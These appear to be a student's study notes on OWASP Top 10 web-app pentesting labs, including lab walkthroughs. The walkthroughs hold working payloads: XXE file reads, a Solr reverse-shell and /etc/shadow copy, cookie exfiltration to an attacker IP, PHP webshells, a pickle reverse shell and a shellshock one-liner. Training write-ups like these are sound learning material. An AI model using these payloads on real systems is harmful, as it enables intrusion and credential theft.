the various client-side info-storage options, one of the more used ones is in browser data itself



[***Sensitive directories listed in robots.txt***](https://youtu.be/7s5RD4OHD4w)
always make sure to look at robots.txt because knowing what the dev doesn't want listed, is usually very juicy!!
always visit the robots.txt and see what's disallowed to the robots




## A3: sensitive data exposure

- ***moral of the story: just don't store sensitive info on the client side***
- [brief](https://deepsource.io/blog/owasp-top-ten-sensitive-data-exposure/) and [another brief](https://www.sitelock.com/blog/owasp-top-10-sensitive-data-exposure/)

- data exposure can happen when info is cached in vulnerable locations. [***Session Storage vs Local Storage vs Cookie***](https://dev.to/bogicevic7/session-storage-vs-local-storage-vs-cookie-elc) and here's [another description](https://bit.ly/37HvGm6) on it: 
  * session storage: *5MB limit*
      * is client-side only, no data transfer to the server
      * each tab/window will create sessionStorage, deleted when closed
  * local storage: *5MB limit*
      * the nature of the storage is similar to sessions storage, except this has no expiration date!
      * it's plaintext, hence insecure. Also means that it has to be serialised
  * cookie: *4KB limit*
      * data + expiration date
      * is passed to the server, can be r/w by both client and server.
      * if it's a `HttpOnly` cookie, then client-side scripts can't access that cookie

***ENCODING =/= ENCRYPTION.***
- encoding is more for the sake of some bijective mapping for the sake of standardising the chars used and prevents the use of special chars 
  - e.g. urls have reserved char % and such...

* [encoding vs encryption vs hashing](https://medium.com/@tittylouis/encoding-vs-encryption-vs-hashing-f1ad7866c4de): 
   * Encoding is the process of converting data from one form to another so that it can be properly consumed by a different type of system. it does not require any sort of KEY to perform the process.
   * Encryption is also a process of transforming data from one form to another. But the primary objective or goal is to keep the information secret. 
   * Hashing’s primary goal is to ensure the integrity of the data. Which means it would be easy to detect whether somebody has altered the contents of the data.  It should not be possible to go from the output to the input. That means like encoding or encryption you cannot convert the hash data back to original value

* [Analysing Hashes](https://www.tunnelsup.com/hash-analyzer/) 
    - charset is usually base64 or hexadecimal
    - `$` delimits the salt and the hash

* [credential stuffing](https://owasp.org/www-community/attacks/Credential_stuffing): 
  - a subset of brute force attacks, involves automated web injection
  - usually, the credentials are sourced from pwd dump sites or via website breaches. 


* ***How to tell if a string is encoded or encrypted?***
* [Hash Identification](https://null-byte.wonderhowto.com/how-to/use-hash-identifier-determine-hash-types-for-password-cracking-0200447/)


* looking at the robots.txt is a good idea since it will tell you what the dev doesn't want crawlers to see, and you might wanna see if those resources/paths are somehow left open. More on [documentation on robots.txt](https://developers.google.com/search/reference/robots_txt
), take note the caching duraion and how google's crawlers respond to the various status codes.
  * [robots.txt is becoming an internet protocol soon](https://tools.ietf.org/html/draft-koster-rep-00)


* sensitive data exposure: 
    * https://deepsource.io/blog/owasp-top-ten-sensitive-data-exposure/
    * https://www.sitelock.com/blog/owasp-top-10-sensitive-data-exposure/


    * https://dev.to/bogicevic7/session-storage-vs-local-storage-vs-cookie-elc
    * https://scotch.io/@PratyushB/local-storage-vs-session-storage-vs-cookie#:~:text=Are%20you%20always%20confused%20between%20session%20storage%2C%20local%20storage%20and%20cookies%3F&text=The%20sessionStorage%20object%20stores%20data,(or%20tab)%20is%20closed.&text=Storage%20limit%20is%20larger%20than%20a%20cookie%20(at%20least%205MB).

    * https://developers.google.com/search/reference/robots_txt


### week5: SQL information available from Web Server Logs, real world webapp
cid=11

[straightforward exploit](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12604)

they didn't restrict the db logs, can access it by going to the endpoint: 
`/Data/Log/<YY_MM_DD>.log`

- this lets us know what dbtables there are and the table names!

### week5: Sensitive Directories in `robots.txt`

cid 1899

This lab looks at the robots.txt files to see what the dev regards as non-crawlable. It appears 
that this dev has indicated a passwords file in it as well as the phpmyadmin console. 

We access the php admin console, where we can navigate and read off the `<host>/passwords`




# Day 6: OWASP top 10: XXE, Broken Access Control, 

## A4 XXE: XML external entity injection
* [**a guide to XML** ](https://portswigger.net/web-security/xxe/xml-entities)
  * DTDs (document type def): define the structureof the XML document, can be either self-contained, external or a hybrid. [about DTDs](https://xmlwriter.net/xml_guide/doctype_declaration.shtml), note that the DTD defines the constraints on the structure of the XML document
  * structure of XML includes: 
    - doc's element types 
    - children element types
    - order and number of each element type
    - attributes
    - entities
    - notations 
    - processing instructions
  * The declaration of an external entity uses the `SYSTEM` keyword and must specify a URL from which the value of the entity should be loaded, e.g.
    * `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>` 
    * or can use the `file://` protocol: `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]> `
   * Example of external private DTD:

            <!DOCTYPE data [<!ENTITY passwd SYSTEM "file:///etc/passwd">]> <data><text>&passwd;</text></data>

            <!DOCTYPE data [<!ENTITY passwd SYSTEM "http://192.81.46.2:9000/passwd">]> <data><text>&passwd;</text></data>
           
  
* [**brief by portswigger**](https://portswigger.net/web-security/xxe#:~:text=Some%20applications%20receive%20client%2Dsubmitted,by%20the%20backend%20SOAP%20service.)

* "External Entity" refers to a storage unit (e.g. a hard drive). 
XXE attacks can be prevented by just using JSON instead (JSON is less complex)

* XXEs a little difficult to detect because XML parser-related logging is usually poor.

***There are various Types of XXE attacks.***
 *[SSRF attacks](https://portswigger.net/web-security/ssrf) where where an external entity is defined based on a URL to a back-end system. . server-side application is induced to make HTTP requests to any URL that the server can access and it exploits trust relationships.
 * exfitrate data *out-of-band*:  
 * Retrieve data by triggerring error messages when parsing XXE
 * Retrieve files in the apllication's response. This uses the `file://<absolute URI>` protocol.
 * XXE attacks via file upload: 
    * via image upload: e.g. if the validation happens after the uploading feature, and the protocols include `SVG`(which uses XML), then we can submit a malicious SVG image to reach this hidden attack surface.

* more on handling [blind xxe](https://portswigger.net/web-security/xxe/blind)


* [useful reading on architectural sytles for APIs: SOAP, REST and RPC](https://medium.com/api-university/architectural-styles-for-apis-soap-rest-and-rpc-9f040aa270fa#:~:text=In%20general%2C%20an%20architectural%20style,%2Dscale%2C%20predefined%20solution%20structure.&text=The%20REST%20style%20(Representational%20State,the%20SOAP%20style%20and%20GraphQL): 
  * info about [GraphQL](https://api-university.com/api-lifecycle/api-design/graphql/):
    - database agnostic, gives more control over the API consumer to describe data needs
    - has two languages: a declarative, typed query language for APIs and a schema language
    - allows clients to do both reading and writing of data
  * [REST api](https://api-university.com/api-lifecycle/api-design/rest/):
    - makes optimal use of HTTP, constraints are due to contraints in HTTP
    - mostly perform CRUD actions on data
  * RPC (Remote Procedure Call) style e.g. JSON-RPC, XML-RPC

### Week 6 lab: XXE Injection
cid 1889 (using mutilidae)

This lab just wants us to play around with setting diff DTDs and playing around with XXE injections using the XML validator

* firstly it appears that validating this: 
    ```xml
    <a> <b> hello world </b> </a>
    ```
  works (no need to even nest it actually) but putting non-strings or even `"1"` will throw error by the parser and say that the xml tag is mal-formed.

* we can attempt at calling for an external entity like so: 
  ```xml
  <!DOCTYPE data [<!ENTITY password SYSTEM "file:///etc/passwd">]>
  <data>
      <text> 
      &password;
      </text> 
  </data>
  ```
  note that the nesting of the text tag within the data tag isn't really necessary, it works even without it.
  Here we're using a locally stored file as the external entity, we can force it to look at a remote location too: 

  ```xml
  <!DOCTYPE data [<!ENTITY passwd SYSTEM "http://192.255.164.2:9000/helloworld">]>
  <data><text>&passwd;</text></data>
  ```
  where the ip addr refers to the attacker's ip, and the port 9000 is a custom port on which we've opened up a listening port using 
  `python -m SimpleHTTPServer 9000`



### Week 6 lab: XML External Entity – alter DTD, XSS attack with XSSer
cid 1889

[XSSer](https://tools.kali.org/web-applications/xsser) is a tool that's useful for doing cross-site scripting attacks. Looking at the manual shows details 
on how it can audit whether a target is vulnerable to XSS. 
To determine if the vulnerability is there, intercept via Burp proxy so that you can see how the tail of that HTTP request is done, to help 
us know how to write out the target. Place the "XSS" as a param. Need to provide the following params for XSSer: 
  * `--url` for the target url
  * `-p` indicating the HTTP method type of POST
  * `'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'` that specifies where XSSer is to sub in its payloads
  * Now, to try various payloads, add the `--auto` flag to the request: `xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto`

If we wanna make our custom payload, we can use the `--Fp` for the final payload and supply the code we want. This will help us generate a final payload eventually 
that we can use to make our final request.

For making GET requests, we can just leave it as is, and supply just the username. 
  
**nb:** for xsser, have to pass in the arguments as a string and the url has to have the protocol indicated e.g. `http://...`



qq: not sure why need to intercept using BURP for this though (and to modify the last line to indicate the `target_host="XSS"`) when we are never forwarding that request from burpsuite

https://youtu.be/EYHrwOageNY

### week6 lab: XML External Entity – CVE: Apache Solr  -alter xml file
cid=1853
Refer discord channel for corrected payload. Error with lab manual.

The target is a Apache Server running Solr 8.1.1, and it's RCE exploits are documented like [here](https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-via-dataimporthandler). The vulnerability lies in data importing config. an xml file has to be hosted
on localhost which will be fetched by the config used for remote code execution.

1. We start a local server for the HTTP transfer of payload file
   * here's a way to set up a PHP server :`php -S 0.0.0.0:80`
   * else just run a SimpleHTTP server via python 
2. add the payload to the configuration for the data import in debug mode: 
    this is the payload: 
      ```xml
      <dataConfig>
        <dataSource type="URLDataSource"/>
        <script><![CDATA[
                function poc(){ java.lang.Runtime.getRuntime().exec("cp /etc/shadow /opt/solr/server/solr-webapp/webapp/poc.txt");
                }
        ]]></script>
        <document>
          <entity name="stackoverflow"
                  url="http://192.17.117.2/solr"
                  processor="XPathEntityProcessor"
                  forEach="/note"
                  transformer="script:poc" />
        </document>
      </dataConfig>
    ```
    this payload will:
      * copy the shadow file and copy it into a file `poc.txt` which will be available on the webroot itself. We can find it by looking at /solr/poc.txt
      * indexes the xml file 
  btw this is the diff b/w [password files nad shadow files](https://kerneltalks.com/linux/difference-between-etc-passwd-and-etc-shadow/)

### week 6 lab: XML External Entity – CVE: Apache Solr  
cid=1530

this deals with vulnerability on solr 7.1.1, [exploit db post on it](https://www.exploit-db.com/exploits/43009). 
We send a json payload that allows us to do RCE. Attacker's machine shall listen on netcat and 

payload :

```json
{
  "add-listener" : {
  "event":"postCommit",
  "name":"payload",
  "class":"solr.RunExecutableListener",
  "exe":"sh",
  "dir":"/bin/",
  "args":["-c", "echo 'bash -i >& /dev/tcp/192.130.137.2/1234 0>&1' > /tmp/remote.sh;chmod 777 /tmp/remote.sh;bash /tmp/remote.sh"]
  }
}
```

this payload adds a listener to the target url at `solr/attackdefense/config`



## A5 Broken Acess Control

[Brief on Broken Acess Control](https://www.packetlabs.net/broken-access-control/): 
* vulnerability: when users can act outside of their intended permissions. It's more of a stepping stone in your pipeline of attacks you wanna do
  * deals with these services:   implementing authentication into web applications such as password security, account recovery controls, password reset controls, account permissions, and session management. 
* ***Horizontal Access Control***: from users of same privilege level
* ***Vertical Access Control***: from users of different (higher) privilege levels 
* Access control issues are typically not detectable by dynamic vulnerability scanning and static source-code review tools as they require understanding of how certain pieces of data are used within the web app. Manual testing is the best way to detect missing or broken *access controls.
*
* Risk: *generally impacts the confidentiality and integrity of data*


* [**Federated Identities: openid, saml, oauth:**](https://www.softwaresecured.com/federated-identities-openid-vs-saml-vs-oauth/)
  - using a service to help with identity management, based on a trust relationship with that identity management system. Solves the problem of "how to bring together user login information across many applications and platforms to simplify sign-on and increase security".
  - saml with Single Sign on uses XML for identity assertions, and might be vulnerable to XXE attacks





### week 6 lab: Insecure Object Direct Reference – Horizontal and Vertical Escalation
cid=1907 [youtube link](https://youtu.be/LF5DV_g7QBE)

The "Object" here refers to files, data... resources in general. 
The target here is a railsgoat application.
After logging in as a normal user, by observing the url params, we see that the id name is part of it,
we try chaning the id number to access other user's data. This allows **horizontal access**. 

We look at the account recovery / password changing feature, intercept the request to that, and modify
the params of that to change the login credentials of another user. This is **horizontal escalation** as 
we get to take over that other user's account.  

Now, if we do the same for **UID 1, which is usually the default id for the admin account**, then 
we take over the admin account and that is **vertical escalation!**





### week 6 lab: Insecure Object Direct Reference II – Changing ticket price
[cid 1899](https://youtu.be/K20DBHufewQ)

Similarly, the object is referenced directly, so intercept the HTTP request and modify the params being passed,
change the price tag and you get to change the ticket price.





# current lab list
- [error based sql injection](https://www.attackdefense.com/challengedetails?cid=1903)
- [blind time sql injection](https://www.attackdefense.com/challengedetails?cid=1902)


Lesson 5
Union Based SQL Injection https://www.attackdefense.com/challengedetails?cid=1902
Error Based SQL Injection https://www.attackdefense.com/challengedetails?cid=1903
Blind Boolean Based SQL Injection https://www.attackdefense.com/challengedetails?cid=1904
Blind Time Based SQL Injection https://www.attackdefense.com/challengedetails?cid=1905


week 6 labs to do: 



### week6 lab: Local file inclusion – change filename
[cid 1899](https://youtu.be/IRZ1KKIMffo)

Acess control hasn't been done properly here, we realise that we can just change the 
url params is as such: `http://192.245.219.3/rlfi.php?language=lang_en.php&action=go` and 
include some local file as part of the http request! 





### week6 lab: Local file inclusion & Directory traversal - bloofoxCMS
cid 279

Here, we have a real world webapp, a CMS. There are two vulnerabilities in this, so 
we look into the version details about which version of Bloofox the site runs on, and 
realise that [this is the more appropriate vulnerability](https://www.exploit-db.com/exploits/39032)

the exploit is to add to the url these params: `/index.php?mode=settings&page=editor&fileurl=config.php`

then we just trial and error (?) and we attempt to do some directory traversal and realise that 
if we pass in this as the fileurl: `../../../../../etc/passwd`, we can directly read off the 
passwd file of the system. This includes a local file (just dumps it)


***nb: admin on a service =/= admin on a system** the former one is more like a user-group, where you're 
like a moderator

### week6 lab: Local file inclusion & Directory traversal - bloofoxCMS
https://www.attackdefense.com/challengedetails?cid=277

### week6 lab: Directory Traversal
[1899](https://youtu.be/Sx26dpb7G6c)

Well this is literally just a directory traversal


# day 7: Broken Access Control, Security Misconfiguration

Consider sessions-handling thru the use of cookies, the server shall assign a sessions id and there are 3 possible places the cookie may be stored: 
in the HTML form field, in the URL and within the cookie

more on [HTTP cookies](https://docs.microsoft.com/en-us/windows/win32/wininet/http-cookies?redirectedfrom=MSDN)
**server setting the cookie:** uses the special `Set-Cookie` header 

  ```
  Set-Cookie: <name>=<value>[; <name>=<value>]...
  [; expires=<date>][; domain=<domain_name>]
  [; path=<some_path>][; secure][; httponly]
  ```

* if expiry date isn't set, then it's a sessions cookie
* if the `httponly` field exists then javascript can't read/write that cookie. This makes is safer since most attacks hinge on javascript, it's a XSS mitigation mechanism
* 


### week 7 lab: Remote File Inclusion I 


**in real life**, the RFI needs some amount of *social engineering* to be done such that the victim does the requesting of that particular crafted url that the attacker desires.
  attacker crafts a url. This url he sends to the url (e.g. via forum / email...) 
  when user clicks on the url, this crafter url is sent to the real web server which won't have that resource so it contacts the attacker's server to fetch that

Here, the target's url params allow us to request for a resource in a remote location. Our objective is to steal the 
cookie for the current session. 

1. first we set up attacker's server on a specific port 
2. on attacker's machine, set up a file with the following script payload: 

  ```html
  <img id="img" src="">

  <script> 
      document.getElementById("img").src="http://192.53.222.2/?cookie="+document.cookie
  </script> 
  ```
3. now, include this file by passing in the correct url like so: `http://192.53.222.3/index.php?page=http://192.53.222.2/getCookies.txt` 
4. this will cause that follwing script to run, giving us the cookie for that session
  

### week 7 lab: Remote File Inclusion II PHP Shell
[cid 1899](https://youtu.be/yCmVnXcXFE4)

similar to the previous lab, this time, we create a php script that will give us a webshell: 

1. set up attacker's server
2. payload file: 
   ```php
   <?php
   
   $output=shell_exec("ps -eaf");
   echo "<pre".$output."</pre>";
   
   >

   ```

   note: the `<pre>` html tags prevents preformatting of the text, and hence is seen as raw text input. 
3. do this RFI, realise: 
    * PID 1 is usually the init process but in this case, it's a supervisor, googling hints that this application is containerised. Since containerised apps are ***ephemeral*** (can be cycled in and out), we might not really gain much from breaking this app


## A6: Security Misconfiguration

This is pretty generic of a description actually, anything whereby the config isn't done properly will fall under this. 
Examples: WebDAV setup, controlling what HTTP request methods are permissible, sanitising input fields...

[examples of security misconfiguration](https://hdivsecurity.com/owasp-security-misconfiguration)
- directory listing refers to that default listing of subdirs when an index page doesn't exist!
- when debugging info is openly available

[A brief on webdav, its history and everything](https://www.cloudwards.net/what-is-webdav/#:~:text=WebDAV%20stands%20for%20Web%20Distributed,to%20collaborate%20on%20web%20content)
- seems like it's what's under the hood when it comes to file hosting and stuff

### week7 lab: Missing Function-Level Access Control: Arbitrary Folder Deletion
[350](https://youtu.be/IfrrvgvLYao)

[the exploit in about Monstra CMS](https://www.exploit-db.com/exploits/44512), involving an insecure permissions that allows us to delete files/folders arbitrarily. 

We create some dummy dirs, using the console given. Then we set up proxy to intercept the delete request. 
Modify the params such that the entire `/uploads` dir is deleted. This sort of breaks the entire upload feature of the app.

Have to do it by intercepting the HTTP request, rather than just crafting the url because crafting the url will not have the correct security token and the server will just return "invalid token" error.




### week7 lab: Vulnerable Apache Sever- Lack of Access Control on POST

[cid 198](https://youtu.be/LN0hyMQPbeU)

This was funny. Simple HTTP auth was done, we intercept using our own machine's burp and change the request method 
from GET to POST and this somehow magically gives us access.

### week7 lab: WED-DAV – Missing Access control on upload method
[cid=1802](https://youtu.be/qdHIMDum3qw)

Goal: we wanna steal the cookie by expoilting the DAV misconfiguration that allows us to upload files onto the `/uploads` dir. 
payload file's contents:

  ```html
  <!-- filename: getCookie.html -->
  <img id="getCookie" src""/>

  <script> 
    document.getElementById("getCookie").src="http://192.65.175.2/?cookies="+document.cookie;
  </script>
  ```
upload this file using curl like so: 
`curl 192.65.175.3/uploads/ --upload-file getcookie.html`

Now, we set up a listening server on attacker machine, and access that file in the victim's machine, which
will make the script run and send the attacker machine the url with the cookie appended to it.



## A7: Cross-Site Scripting: XSS

rule of thumb: activeJS supplied by the client side should never be rendered on the page itself without the server sanitising that JS. 

 [XSS is a very deep area](https://excess-xss.com/) : 
 - there are different types of XSS, e.g. persistent, reflected, dom-manipulation...


### week 7 lab: Article Setup – reflected XSS
[cid=492](https://youtu.be/u2yRbFEd894)

[just another XSS vulnerability](https://www.exploit-db.com/exploits/28564). It's enough to show that 
the XSS is reflected so doing something like `<script> alert("myAlert is nice" )</script>` is enough.


### week 7 lab: APHP Micro Blog – Persistent XSS, negative example of reflected XSS
[cid=29](https://youtu.be/rEqXQg_0Hjw)
The attacker might not have any user level access to the web application. However, this does not mean that the application cannot be used to attack other users. Stored Cross Site Scripting could be triggered even by unauthenticated users.

[it's a persistent XSS exploit](https://www.exploit-db.com/exploits/40505) whereby the comments feature, the input text field is sanitised but then the name and email field in that form is not, which allows us to inject some code in there. 
payload: 

  ```html
  <script> alert(document.cookie)</script>
  ```
rmb not to leave the other fields in the form empty, including the CAPTCHA check
Publishing this comment will cause the script to run.



### week7 lab: RCE Via MySQL 

There's a misconfiguration done on the `secure_file_priv`. If the string value for that param is left empty, then
the web root directory is ***world writable***. 

Here, we use the [***wappalyzer plugin***](https://www.wappalyzer.com/), realise that it's running PHP, so our payload needs to be catered for php. 

check for nmap script for mysql: `ls -l /usr/share/nmap/scripts  | grep mysql`

we have a script that checks if the MySQL service is configed w root pwd or not, run that script: 
`nmap --script mysql-empty-password -p 3306 192.173.248.3`

it appears that the root account (for the sql server btw) doesn't have any assigned pwd, so we can log into the MySQL server as root user: `mysql -u root -h 192.173.248.3`

check if file creation is allowed: `select  "hello world" into outfile "/tmp/temp" from mysql.user limit 1;`, if so, then can write files into arbitrary directories if the directory is ***world writable***. 

We write a PHP webshell into it then, payload: 
  ```sql
  select "<?php $output=shell_exec($_GET["cmd"]);echo "<pre>".output."/pre"?" into outfile "/var/www/html/shell.php" from mysql.user limit 1;"
  ```


https://excess-xss.com/

https://www.cloudwards.net/what-is-webdav/#:~:text=WebDAV%20stands%20for%20Web%20Distributed,to%20collaborate%20on%20web%20content.


# Day 8: Insecure Deserialisation, Using Compromised Components and Insufficient Logging & Monitoring


## [insecure deserialisation](https://thehackerish.com/insecure-deserialization-explained-with-examples/)
- a deserialisation routine also refers to some kinda "manual", which is the lib e.g. "pickle" uses to work with the object note that serialisation is diff from encoding because encoding is flat and interrelations not kept... 
  think of it as conversion into a stream of bytes while maintaining the interrelationships

- this is pretty language specific actually. e.g. in the case of python, we have to exploit how picking is done (hence the `__reduce__` method being written that tells the deserialiser how to work with the object)
- 

[writeup on it](https://thehackerish.com/insecure-deserialization-explained-with-examples/)


### week 8 lab: Pickeld Deserialiser II -Change serialized cookie with different value
[cid 1915](https://youtu.be/O7q6MbfpAzo)

We tried to see if deserialisation vulnerability exists by decoding the cookie, then modifying what looked like arguments, encoding it back to b64 and then sending a request to the website. Note that the encoding scheme for the cookie value was hinted at by the ending `=` character.

Once confirmed, we wrote a python script that gives us a cookie that can do RCE: 

  ```python
  import pickle
  import base64
  import subprocess 

  class User(object): 
    def __reduce__(self): 
      return(self.__class__, (subprocess.check_output(["whoami"])))
    def __init__(self, name):
      self.name = name
  user = User("jim")
  cookie = base64.b64encode(pickle.dumps(user))
  print(cookie)
  ```

  the `__reduce__` method is called during pickling, it returns a tuple that shows how to reconstruct the class when unpickling, 
  OR it returs a string that represents the name of a global variable.Basically tells the deserialiser how to work with the object.

### week8 lab: Pickeld Deserialiser I - Change serialized object to reverse shell object
[cid=1912](https://youtu.be/e3e3m5i5twE) 

```python
import pickle
import base64
import subprocess 
import os

class Shell(object): 
  def __reduce__(self): 
    return (os.system, ("python -c 'import socket, subprocess, os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"192.128.12.2\", 1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(), 2); p = subprocess.call([\"/bin/sh\",\"-i\"]);'&",))

pickledData=pickle.dumps(Shell())
print(base64.b64encode(pickledData))
```

this gives us a ***reverseshell!*** also note that the method here is `dumps` and not `dump`
also, `socstream` in that payload means it's a tcp socket

## Using Vulnerable Components

### week8 lab: Vulnerable Xdebug
[cid=1909](https://youtu.be/BTsNpCd1Xog) 

The target webapp here has it's phpinfo available, where we can see what components/dependencies are used for the webapp. We see that [Xdebug is being used and the version of it has a metaspoloit exploit](https://www.exploit-db.com/exploits/44568). 

We used [Searchsploit](https://hydrasky.com/network-security/searchsploit-a-command-line-search-tool-for-exploit-db/) to look thru exploitDB for a known exploit, after which we looked thru metasploit for an exploit, just ran that exploit and that opened [an instance of metapreter](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/) and we just used the webshell from there.

### week 8 lab: Vulnerable to shellshock
[1911](https://youtu.be/igr5i68lRzw)

more of a bash system vulnerability that can be exploited thru a web interfaces based on how a request gets handled on the server side, more on [shellshock as explained by cloudfare](https://blog.cloudflare.com/inside-shellshock/) and the [CVE repo](https://github.com/opsxcq/exploit-CVE-2014-6271)

Here, we notice upon inspecting the webpage that there's a CGI ([Common Gateway Interface](https://en.wikipedia.org/wiki/Common_Gateway_Interface))script, specifically, `gettime.cgi` that's running on that target, so some sort of CLI environment going on, we want to see if it's vulnerable to the shellshock exploit. 

We use nmap's nse script to check if it's vulnerable to shellshock : `nmap --script http-shellshock --script-args “http-shellshock.uri=/gettime.cgi” <target ip>`. This confirms that shellshock vulnerability exists. 

the payload example is found in the repo. e.g. `() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'`. [see slide 12 for explanation to that bash one-liner](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf) Using Burp to intercept a request, Inject the payload into the user-agent argument of the HTTP header. The output willbe in the response. 

## Insufficient Logging

### week 8 lab: Log Analysis for GoAccess
[cid=142](https://youtu.be/dw7GiUNOgY0)

[GoAccess](https://goaccess.io/) is a logging utility that runs on *nix systems. 

1. there's an entire chart for static resource queries, that's how we know what resources are asked for, we can sort via the various columns, including bandwidth
2. identifying a ddos attack: 
   1. we see that on 4 Apr, there was a huge spike in number of hits relative to the increase in number of unique visitors
3. next, to see the percetage of use of HTTP 1.0 as compared to other protocols, look at the requested files by url and we can sort by protocol 
4. By looking at the 404s, we can tell what the attacker was attempting to look for. 
   1. e.g. we see that the requests for logs for `wp-login.php` gave 404s, the attacker was trying to see if wp was the CMS being used by the webapp
5. We can access geolocation data and know how much of the traffic originated from a particular country
6. We can also determine which OS was used by most of the requesters, e.g. for mobile, on Android OS, most were using marshmellow...
7. By looking at the browsers (and under crawlers), we can know which browser's bots had crawled the site
8. We can look at referrer sites too, here github is the largest external referrer
9. Geolocation data includes grouping by continent as well as by countries
  


### week 8 lab: Log Analysis for Apache
[cid=1181]

This server has the [Kibana dashboard](https://www.elastic.co/kibana) for elastisearch. The rough idea is to figure out how to use kibana's query language and create a visualisation for it

Flags: 
1. SQLmap was used to do a SQLi attack, we can found out which was the vulnerable webpage. To help us, Kibana has its own query language and we filter it by useragent since sqlmap is the user agent: `agent *sqlmap*`. Next, we use the visualisation tool, create a pie chart, with this filter: ` request:"index.php?page=*"`. This shows the `index.php` is the one that had SQLi as there were 42,422 requests made to `index.php` 
2. finding out the ips of the computers that were doing directory enum requires looking into the 404s logs, we create a visualisation, settle the correct 
3. path traversal attacks/LFI attacks/URLencoding attacks, where the target was `/etc/shadow`, we can apply the filter `*etc**shadow*` and get 2 hits for that target
4. filter: ` request.keyword:"/btslab/tmp/" and response:200`gives the ip addr of the attacker that reached that resource
5. to determine number of union based SQLi attacks, filter: `*union* and *select*`
6. to check if any requests had a specific response code, filter: `response:500`
7. a dir traversal attack was used to fetch the passwd file. Firstly we filter by pdf: `request:*pdf*`, giving us the url used, then we can look for other such directory traversal attempts by filter: `request:"/btslab/vulnerability/dor/download.php?file="`. This shows us the response length in bytes when its a failed response, 240 bytes. Now we modify the fitler to: ` request:"/btslab/vulnerability/dor/download.php?file=" and request:*etc* andrequest:*passwd*` to filter out the passwd file


[SKIPPED THE REST OF THE FLAGS ON ANALYSING CSRF ATTACKS. ANOTHER TIME MAN]


### week8 lab: Privilege Escalation Web to Root
https://www.attackdefense.com/challengedetails?cid=85
https://youtu.be/AeFzdX-vhW8



# less important labs to do soon: 
- [webtoshell](https://www.attackdefense.com/challengedetails?cid=883)
- [some mvc thing](https://www.attackdefense.com/challengedetails?cid=1880) and [another mvc thing](https://www.attackdefense.com/challengedetails?cid=1802)
- burp login form attack and http attack

# todos and toreads

# uncategorised readings:

* [deception](https://www.helpnetsecurity.com/2018/12/06/introduction-deception-technology/) technology and [honeypots](https://roi4cio.com/en/categories/category/deception-techniques-and-honeypots/)
   - this is actually really cool. Some forefront-of-cybersec kind of thing

* [using default credential config can be really problematic because shodan is really useful in searching for stuff!](https://thor-sec.com/cheatsheet/shodan/shodan_cheat_sheet/)

* [browser plugin and extensions](https://www.securityweek.com/websites-can-exploit-browser-extensions-steal-user-data) they are shady and shouldn't be trusted like that. The standards that extensions have to follow is more lax than those of websites themselves, hence extensions are very exploitative.

* [devsecops: not exactly devops and with security in mind](https://www.sumologic.com/insight/devsecops-rugged-devops/#:~:text=DevSecOps%20involves%20creating%20a%20'Security,processes%20within%20an%20agile%20framework)

* XXE:

    * https://gracefulsecurity.com/xxe-xml-external-entity-injection/
    * https://portswigger.net/web-security/xxe#:~:text=Some%20applications%20receive%20client%2Dsubmitted,by%20the%20backend%20SOAP%20service.
    * more on xml dtd (doctype declaration): https://xmlwriter.net/xml_guide/doctype_declaration.shtml
            * Example of external private DTD:

            <!DOCTYPE data [<!ENTITY passwd SYSTEM "file:///etc/passwd">]> <data><text>&passwd;</text></data>

            <!DOCTYPE data [<!ENTITY passwd SYSTEM "http://192.81.46.2:9000/passwd">]> <data><text>&passwd;</text></data>

* broken access control: https://www.packetlabs.net/broken-access-control/
      * SAML: https://www.softwaresecured.com/federated-identities-openid-vs-saml-vs-oauth/


* communication architecture for remote procedures/services:  https://medium.com/api-university/architectural-styles-for-apis-soap-rest-and-rpc-9f040aa270fa#:~:text=In%20general%2C%20an%20architectural%20style,%2Dscale%2C%20predefined%20solution%20structure.&text=The%20REST%20style%20(Representational%20State,the%20SOAP%20style%20and%20GraphQL.

* [SAST vs DAST](https://www.kiuwan.com/blog/application-security-tools-comparison/): 
  - these areapp security testing tools, mainly differ by how the testing is done




* [CRLF characters](https://tools.ietf.org/html/rfc2616)
* [metasploit tutorial](https://www.youtube.com/watch?v=8lR27r8Y_ik)
* [what meterpreter is](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)
* [case study of equifax leak: some apache struct caveat](https://www.brighttalk.com/webcast/13983/280311/behind-the-equifax-breach-a-deep-dive-into-apache-struts-cve-2017-5638)
* [honeypots](https://www.forcepoint.com/cyber-edu/deception-technology)
* [understanding rainbow tables for password cracking](https://www.geeksforgeeks.org/understanding-rainbow-table-attack/)
* [wikipage on jwts](https://en.wikipedia.org/wiki/JSON_Web_Token) and reading up on [public key authentication](https://en.wikipedia.org/wiki/Public-key_cryptography)
* [opaque actually makes things opaque](https://medium.com/@billatnapier/opaque-one-of-the-great-advancements-in-cybersecurity-aace51a76560)
* look into learning GOlang for writing own scripts and crawlers
* port(external pov) vs socket(as file descriptors?)
* 






# Useful References
* [tldrs for man pages](https://tldr.sh/)
* [pentesteracademy relevant webapp pentesting labs](https://www.attackdefense.com/listing?labtype=pa-web-app-pentesting&subtype=pa-web-app-pentesting-video-labs)
* [google dorking methods](https://securitytrails.com/blog/google-hacking-techniques) and [a database for google dorks](https://www.exploit-db.com/google-hacking-database)
* [shodan search engine](https://www.shodan.io/)
* [burpsuite downloads](https://portswigger.net/burp/releases/professional-community-2020-4)
* hashcat, john the ripper,mdk <---some tools: 
* - [hydra](https://tools.kali.org/password-attacks/hydra)
  https://sectools.org/tag/pass-audit/
* [metasploit tutorial](https://www.youtube.com/watch?v=8lR27r8Y_ik)
* cheatsheets: 
  * [red team tutorials, has nice cheatsheets and other tutorials on loads of pentesting tools](https://redteamtutorials.com/)
  * [netcat cheatsheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)
  * [sql cheatsheet](https://devhints.io/mysql)
